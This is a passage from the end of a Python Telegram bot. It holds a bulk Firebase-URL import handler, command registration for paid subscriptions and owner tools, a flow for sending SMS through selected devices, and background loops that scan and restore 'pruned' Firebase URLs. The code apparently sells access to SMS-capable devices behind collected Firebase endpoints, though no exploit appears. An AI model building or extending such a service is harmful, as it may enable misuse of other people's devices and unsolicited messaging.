            await safe_send_message(context, update.effective_chat.id, "❌ Please upload a .txt file.")
            return True

        try:
            file_obj = await context.bot.get_file(doc.file_id)
            file_bytes = await file_obj.download_as_bytearray()
            text_content = file_bytes.decode("utf-8", errors="ignore")
            self.clear_state(uid)
            result = await self.bulk_add_firebase_from_text(text_content)
            lines = [f"📥 <b>Bulk Import from {escape(doc.file_name)}</b>", "━━━━━━━━━━━━━━━━━━━━━"]
            lines.append(f"✅ Added: <code>{result['added']}</code> new URLs")
            lines.append(f"⚠️ Duplicates skipped: <code>{result['duplicates']}</code>")
            if result["rejected"]:
                lines.append(f"❌ Rejected: <code>{len(result['rejected'])}</code> invalid entries")
            if result["urls"]:
                lines.append("\n<b>Added URLs:</b>")
                for u in result["urls"]:
                    lines.append(f"• <code>{u}</code>")
            await safe_send_message(context, update.effective_chat.id, "\n".join(lines), reply_markup=self._back_button())
            return True
        except Exception as e:
            logger.error("Bulk firebase file import error: %s", e)
            await safe_send_message(context, update.effective_chat.id, f"❌ Failed to process file: {e}", reply_markup=self._back_button())
            return True

# ============================================================================
# Bot Application Runner
# ============================================================================

class BotApplication:
    def __init__(self, config: BotConfig):  
        self.config = config  
        self.http_client = HTTPClient(config)  
        self.firebase = FirebaseService(config, self.http_client)  
        self.user_service = UserService(config, self.firebase)  
        self.channel_service = ChannelService(config)  
        self.sms_service = SMSPollingService(config, self.firebase)  
        self.handlers = BotHandlers(  
            config,  
            self.firebase,  
            self.user_service,  
            self.channel_service,  
            self.sms_service,  
        )  
        # Initialize Admin Panel (20+ owner features)
        self.admin_panel = AdminPanel(config, self.firebase, self.user_service, self.handlers)
        self.handlers.admin_panel = self.admin_panel
        self._maintenance_task: Optional[asyncio.Task] = None  
        self._health_check_task: Optional[asyncio.Task] = None  
        self._pruned_checker_task: Optional[asyncio.Task] = None  
      
    async def _global_error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if isinstance(context.error, BadRequest) and "Query is too old" in str(context.error):
            return
        logger.error("Global exception handling update: %s", context.error)  
      
    def build(self) -> Application:  
        app = (  
            ApplicationBuilder()  
            .token(self.config.BOT_TOKEN)  
            .read_timeout(15.0)  
            .write_timeout(15.0)  
            .connect_timeout(15.0)  
            .pool_timeout(15.0)  
            .build()  
        )  
          
        app.add_error_handler(self._global_error_handler)  
          
        app.add_handler(CommandHandler("start", self.handlers.cmd_start))  
        app.add_handler(CommandHandler("help", self.handlers.cmd_help))  
        app.add_handler(CommandHandler("buy", self.handlers.cmd_buy))  
        app.add_handler(CommandHandler("refer", self.handlers.cmd_refer))  
        app.add_handler(CommandHandler("gift", self.handlers.cmd_gift))  
        app.add_handler(CommandHandler("broadcast", self.handlers.cmd_broadcast))  
        app.add_handler(CommandHandler("addurl", self.handlers.cmd_addurl))  
        app.add_handler(CommandHandler("addurls", self.handlers.cmd_addurl))  
        app.add_handler(CommandHandler("urls", self.handlers.cmd_urls))  
        app.add_handler(CommandHandler("scanurls", self.handlers.cmd_scanurls))  
        app.add_handler(CommandHandler("delurl", self.handlers.cmd_delurl))  
        app.add_handler(CommandHandler("addtime", self.handlers.cmd_addtime))  
        app.add_handler(CommandHandler("changetime", self.handlers.cmd_changetime))  
        app.add_handler(CommandHandler("removetime", self.handlers.cmd_removetime))  
        app.add_handler(CommandHandler("time", self.handlers.cmd_time))  
        # ── Admin Panel Commands ──
        app.add_handler(CommandHandler("admin", self.handlers.cmd_admin))
        app.add_handler(CommandHandler("redeem", self.handlers.cmd_redeem))
        app.add_handler(CommandHandler("ban", self.handlers.cmd_ban))
        app.add_handler(CommandHandler("unban", self.handlers.cmd_unban))
        app.add_handler(CommandHandler("banned", self.handlers.cmd_banned))
          
        conv_handler = ConversationHandler(  
            entry_points=[  
                CallbackQueryHandler(  
                    self.handlers.conv_send_sms_entry,  
                    pattern=r"^send_[A-Za-z0-9]+$",  
                )  
            ],  
            states={  
                ConversationState.WAIT_RECIPIENT.value: [  
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handlers.conv_recv_recipient),  
                    CallbackQueryHandler(self.handlers.conv_back_to_device, pattern=r"^sel_"),  
                ],  
                ConversationState.WAIT_MESSAGE.value: [  
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handlers.conv_recv_message),  
                    CallbackQueryHandler(self.handlers.conv_back_to_device, pattern=r"^sel_"),  
                ],  
            },  
            fallbacks=[  
                CallbackQueryHandler(self.handlers.conv_back_to_device, pattern=r"^sel_"),  
                CommandHandler("cancel", self.handlers.conv_timeout),  
                CommandHandler("start", self.handlers.cmd_start),  
            ],  
            conversation_timeout=self.config.SMS_CONVERSATION_TIMEOUT,  
            per_user=True,  
            per_chat=True,  
            per_message=False,  
            allow_reentry=True,  
        )  
        app.add_handler(conv_handler)  

        app.add_handler(MessageHandler(  
            filters.TEXT & ~filters.COMMAND,  
            self.handlers.handle_text_message,  
        ))  
        app.add_handler(MessageHandler(
            filters.Document.ALL,
            self.handlers.handle_document,
        ))
          
        app.add_handler(CallbackQueryHandler(self.handlers.handle_callback))  
          
        app.post_init = self._on_startup  
        app.post_shutdown = self._on_shutdown  
        return app  
      
    async def _on_startup(self, app: Application) -> None:  
        logger.info("Bot starting up...")  
        try:  
            user_commands = [  
                BotCommand("start", "Open main menu"),  
                BotCommand("buy", "Purchase subscription plan"),  
                BotCommand("refer", "Invite friends & earn time"),  
                BotCommand("redeem", "Redeem a gift code"),  
                BotCommand("help", "Contact support & info"),  
            ]  
            await app.bot.set_my_commands(user_commands, scope=BotCommandScopeDefault())  
              
            owner_commands = [  
                BotCommand("start", "Open main menu"),  
                BotCommand("admin", "👑 Admin Control Panel"),
                BotCommand("buy", "Purchase subscription plan"),  
                BotCommand("refer", "Invite friends & earn time"),  
                BotCommand("redeem", "Redeem a gift code"),
                BotCommand("help", "Contact support & info"),  
                BotCommand("gift", "Gift validity to all users"),  
                BotCommand("broadcast", "Broadcast message to users"),  
                BotCommand("addurls", "Add Firebase URLs"),  
                BotCommand("urls", "List URLs (.txt report)"),  
                BotCommand("scanurls", "Scan & restore all working URLs"),  
                BotCommand("delurl", "Remove Firebase URL"),  
                BotCommand("addtime", "Add time to user"),  
                BotCommand("changetime", "Set exact validity for user"),  
                BotCommand("removetime", "Expire validity for all users"),  
                BotCommand("time", "Export users status (.txt report)"),
                BotCommand("ban", "Ban a user"),
                BotCommand("unban", "Unban a user"),
                BotCommand("banned", "List banned users"),
            ]  
            await app.bot.set_my_commands(owner_commands, scope=BotCommandScopeChat(chat_id=self.config.OWNER_ID))  
            logger.info("Bot commands registered successfully.")  
        except Exception as e:  
            logger.warning("Could not set bot commands: %s", e)  
          
        try:  
            urls = await self.firebase.get_urls()  
            logger.info("Loaded %d Firebase URLs.", len(urls))  
            asyncio.create_task(self.firebase.get_all_clients(force_refresh=True))
        except Exception as e:  
            logger.warning("Error loading Firebase URLs: %s", e)  
          
        self._maintenance_task = asyncio.create_task(self._maintenance_loop(), name="maintenance")  
        self._health_check_task = asyncio.create_task(self._health_check_loop(), name="health_check")  
        self._pruned_checker_task = asyncio.create_task(self._pruned_checker_loop(), name="pruned_checker")  
        logger.info("Bot is ready and listening for commands.")  
      
    async def _on_shutdown(self, app: Application) -> None:  
        logger.info("Bot shutting down...")  
          
        if self._maintenance_task:  
            self._maintenance_task.cancel()  
        if self._health_check_task:  
            self._health_check_task.cancel()  
        if self._pruned_checker_task:  
            self._pruned_checker_task.cancel()  
          
        await self.sms_service.stop_all()  
        await self.handlers.cleanup_inactive_sessions()  
        await self.http_client.close()  
        gc.collect()
        logger.info("Shutdown complete.")  
      
    async def _maintenance_loop(self) -> None:  
        try:  
            while True:  
                await asyncio.sleep(self.config.CACHE_CLEANUP_INTERVAL)  
                await self.firebase.data_cache.cleanup()  
                await self.channel_service.cache.cleanup()  
                await self.handlers.cleanup_inactive_sessions()  
                gc.collect()
        except asyncio.CancelledError:  
            pass  
        except Exception as e:  
            logger.warning("Maintenance loop exception: %s", e)  
      
    async def _health_check_loop(self) -> None:  
        try:  
            while True:  
                await asyncio.sleep(self.config.HEALTH_CHECK_INTERVAL)  
        except asyncio.CancelledError:  
            pass  
        except Exception as e:  
            logger.warning("Health check loop exception: %s", e)  

    async def _pruned_checker_loop(self) -> None:  
        try:  
            while True:  
                await asyncio.sleep(self.config.PRUNED_RECHECK_INTERVAL)  
                await self.firebase.check_and_restore_pruned_urls()  
        except asyncio.CancelledError:  
            pass  
        except Exception as e:  
            logger.warning("Pruned checker loop exception: %s", e)  

# ============================================================================
# Main Entry Point
# ============================================================================

def main() -> None:
    config = BotConfig()
    bot_app = BotApplication(config)
    application = bot_app.build()
    application.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
